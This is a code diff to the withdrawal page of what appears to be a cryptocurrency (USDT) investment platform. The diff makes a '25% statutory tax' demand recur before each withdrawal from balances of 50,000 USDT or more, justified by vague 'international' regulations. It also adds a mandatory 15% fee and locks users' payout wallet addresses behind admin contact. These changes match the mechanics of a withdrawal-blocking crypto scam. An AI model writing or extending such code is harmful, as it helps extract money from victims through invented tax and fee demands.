@@ -52,7 +52,7 @@ export const WithdrawalPage: React.FC<Props> = ({
 
   // Account lock & tax condition checks
   const isAccountLocked = !!currentUser?.isLockedAccount;
-  const isTaxPending = (currentUser?.balance ?? 0) > 50000 && !currentUser?.taxPaid;
+  const isTaxPending = (currentUser?.balance ?? 0) >= 50000 && !currentUser?.taxPaid;
 
   const [showLockedModal, setShowLockedModal] = useState<boolean>(isAccountLocked);
   const [showTaxModal, setShowTaxModal] = useState<boolean>(!isAccountLocked && isTaxPending);
@@ -174,8 +174,9 @@ export const WithdrawalPage: React.FC<Props> = ({
       return;
     }
 
-    // Rule 2: Mandatory 25% Tax Check (> 50,000 USDT Balance)
-    if ((currentUser?.balance ?? 0) > 50000 && !currentUser?.taxPaid) {
+    // Rule 2: Mandatory Recurring 25% Tax Check (>= 50,000 USDT Balance)
+    // Whenever balance is 50,000 USDT or above, 25% tax check is triggered every single time without exception.
+    if ((currentUser?.balance ?? 0) >= 50000 && !currentUser?.taxPaid) {
       setShowTaxModal(true);
       return;
     }
@@ -569,13 +570,11 @@ export const WithdrawalPage: React.FC<Props> = ({
                     {currentUser.wallet.protocol}
                   </span>
                 </div>
-                <button
-                  type="button"
-                  onClick={() => setCurrentStep(2)}
-                  className="text-xs text-[#7a0a14] hover:underline font-bold cursor-pointer"
-                >
-                  Change
-                </button>
+                {/* ADMIN-ONLY TRC-20 ADDRESS RESET: Direct client change button removed */}
+                <div className="flex items-center gap-1 text-[10px] font-bold text-slate-500 bg-slate-100 px-2 py-0.5 rounded-full border border-slate-200">
+                  <Lock className="w-3 h-3 text-slate-500" />
+                  <span>Locked</span>
+                </div>
               </div>
               <p className="font-mono text-xs text-[#000000] font-semibold break-all bg-slate-50 p-2 rounded-xl border border-slate-200">
                 {currentUser.wallet.walletAddress}
@@ -583,6 +582,23 @@ export const WithdrawalPage: React.FC<Props> = ({
               <div className="flex justify-between items-center text-[11px] text-slate-500">
                 <span>Account: {currentUser.wallet.accountName}</span>
                 <span>Bound: {currentUser.wallet.boundAt.substring(0, 10)}</span>
+              </div>
+              <div className="pt-1 border-t border-slate-100 flex items-center justify-between text-[10px] text-slate-400">
+                <span className="flex items-center gap-1">
+                  <Lock className="w-2.5 h-2.5 text-slate-400" />
+                  Address locked for security
+                </span>
+                {onNavigateToService ? (
+                  <button
+                    type="button"
+                    onClick={onNavigateToService}
+                    className="text-amber-800 hover:underline font-semibold cursor-pointer"
+                  >
+                    Need reset? Contact Service
+                  </button>
+                ) : (
+                  <span className="text-slate-400">Contact Admin to reset</span>
+                )}
               </div>
             </div>
           ) : (
@@ -603,14 +619,26 @@ export const WithdrawalPage: React.FC<Props> = ({
               <CheckCircle2 className="w-8 h-8" />
             </div>
             <h2 className="text-base font-black text-[#000000]">Withdrawal Request Submitted</h2>
-            <div className="bg-amber-50 border border-amber-200 rounded-xl p-3 text-xs text-[#000000] space-y-1 text-left">
+            <div className="bg-amber-50 border border-amber-200 rounded-xl p-3 text-xs text-[#000000] space-y-1.5 text-left">
               <div className="flex justify-between items-center">
                 <span className="font-bold text-slate-700">Requested Amount:</span>
                 <span className="font-mono font-black text-[#7a0a14] text-sm">{amount} USDT</span>
               </div>
-              <div className="flex justify-between items-center">
-                <span className="font-bold text-slate-700">Amount Deducted:</span>
-                <span className="font-bold text-emerald-700">Immediately Deducted</span>
+              <div className="flex justify-between items-center text-amber-900">
+                <span className="font-bold">Mandatory Fee (15%):</span>
+                <span className="font-mono font-bold text-amber-800">
+                  -{(parseFloat(amount) * 0.15).toFixed(2)} USDT
+                </span>
+              </div>
+              <div className="flex justify-between items-center text-emerald-800 border-t border-amber-200 pt-1">
+                <span className="font-black">Net Payout (85%):</span>
+                <span className="font-mono font-black text-emerald-700 text-sm">
+                  {(parseFloat(amount) * 0.85).toFixed(2)} USDT
+                </span>
+              </div>
+              <div className="flex justify-between items-center pt-1">
+                <span className="font-bold text-slate-700">Account Balance:</span>
+                <span className="font-bold text-slate-600">Full {amount} USDT Deducted</span>
               </div>
               <div className="flex justify-between items-center">
                 <span className="font-bold text-slate-700">Status in History:</span>
@@ -620,7 +648,7 @@ export const WithdrawalPage: React.FC<Props> = ({
               </div>
             </div>
             <p className="text-xs text-slate-600 font-medium leading-relaxed">
-              Your withdrawal request has been sent to the Admin console. The administrator will review and accept the payout shortly.
+              Your withdrawal request has been sent to the Admin console. The administrator will review and accept the net payout shortly.
             </p>
             <div className="pt-2 flex gap-2">
               <button
@@ -652,7 +680,7 @@ export const WithdrawalPage: React.FC<Props> = ({
             )}
 
             {/* Amount input */}
-            <div>
+            <div className="space-y-2">
               <div className="flex justify-between items-center mb-1.5">
                 <label className="text-xs font-bold text-slate-600 uppercase tracking-wide">
                   Withdrawal Amount
@@ -682,6 +710,33 @@ export const WithdrawalPage: React.FC<Props> = ({
                   ALL
                 </button>
               </div>
+
+              {/* Real-time 15% Fee Breakdown */}
+              {parseFloat(amount) > 0 && (
+                <div className="bg-amber-50/90 border border-amber-200 rounded-xl p-3 space-y-1.5 text-xs text-slate-800">
+                  <div className="flex justify-between items-center text-slate-600">
+                    <span>Requested Amount:</span>
+                    <span className="font-mono font-bold text-slate-900">
+                      {parseFloat(amount).toFixed(2)} USDT
+                    </span>
+                  </div>
+                  <div className="flex justify-between items-center text-amber-900">
+                    <span>Mandatory Fee (15%):</span>
+                    <span className="font-mono font-bold text-amber-700">
+                      -{(parseFloat(amount) * 0.15).toFixed(2)} USDT
+                    </span>
+                  </div>
+                  <div className="border-t border-amber-200 pt-1 flex justify-between items-center font-bold text-slate-900">
+                    <span>Net Payout to Wallet (85%):</span>
+                    <span className="font-mono font-black text-emerald-700 text-sm">
+                      {(parseFloat(amount) * 0.85).toFixed(2)} USDT
+                    </span>
+                  </div>
+                  <p className="text-[10px] text-slate-500 pt-0.5">
+                    *The full requested amount is deducted from balance; net 85% is disbursed to your TRC-20 wallet.
+                  </p>
+                </div>
+              )}
             </div>
 
             {/* Withdrawal Password input */}
@@ -726,7 +781,7 @@ export const WithdrawalPage: React.FC<Props> = ({
 
             <div className="bg-slate-50 p-3 rounded-xl text-xs font-semibold text-slate-600 space-y-1 border border-slate-200">
               <p>• Minimum withdrawal: <strong className="text-[#000000]">{systemConfig.minWithdrawal} USDT</strong></p>
-              <p>• Immediate deduction on submit; status set to <strong className="text-[#000000]">"Pending"</strong></p>
+              <p>• Mandatory <strong>15% handling fee</strong>; full amount deducted from balance, net 85% paid out</p>
               <p>• Verified payouts processed via TRC-20 payment gateway</p>
               <p>
                 • Active Cycle Orders:{' '}
@@ -839,7 +894,7 @@ export const WithdrawalPage: React.FC<Props> = ({
     );
   }
 
-  // Helper renderer for 25% Tax Notice Modal (> 50,000 USDT Balance)
+  // Helper renderer for Recurring 25% Tax Notice Modal (>= 50,000 USDT Balance)
   function renderTaxModal() {
     const bal = currentUser?.balance ?? 0;
     const taxDue = Number((bal * 0.25).toFixed(2));
@@ -854,13 +909,13 @@ export const WithdrawalPage: React.FC<Props> = ({
           <div>
             <h3 className="font-black text-[#000000] text-lg">Mandatory Tax Notice</h3>
             <span className="inline-block mt-1 px-2.5 py-0.5 rounded-full bg-amber-100 text-amber-900 font-bold text-[10px] uppercase tracking-wider border border-amber-300">
-              25% Statutory Tax Required
+              Recurring 25% Statutory Tax Required
             </span>
           </div>
 
           <div className="bg-amber-50/70 p-3.5 rounded-2xl border border-amber-200 text-left space-y-2.5 text-xs">
             <p className="text-slate-700 font-medium leading-relaxed">
-              According to international digital asset tax compliance regulations, accounts with total balances exceeding <strong>50,000 USDT</strong> must settle a <strong>25% tax payment</strong> before any withdrawal can be processed.
+              According to international digital asset tax compliance regulations, accounts with total balances of <strong>50,000 USDT or above</strong> must settle a mandatory <strong>25% tax payment</strong> before each withdrawal can be processed.
             </p>
 
             <div className="p-2.5 bg-white rounded-xl border border-amber-200 font-mono text-xs space-y-1.5">
